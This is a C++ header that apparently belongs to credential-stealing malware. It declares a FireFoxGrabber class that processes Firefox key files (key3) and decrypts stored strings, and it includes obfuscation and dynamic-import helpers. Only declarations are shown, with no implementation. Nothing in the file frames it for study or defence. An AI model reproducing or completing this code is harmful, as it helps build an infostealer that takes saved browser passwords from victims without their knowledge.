#pragma once
#include <Windows.h>
#include <string>
#include <vector>

#include "Base64.h"
#include "file.h"
#include "FireFoxBase.h"
#include "DynImport.h"
#include "xor.h"

using std::string;
using std::vector;

class FireFoxGrabber
{
	vector<vector<byte>> key;
public:
	void ProcessKey(const string & fileName, bool isKey3);
	
	string DecryptStr(const string & str);
	bool IsSuccess();
};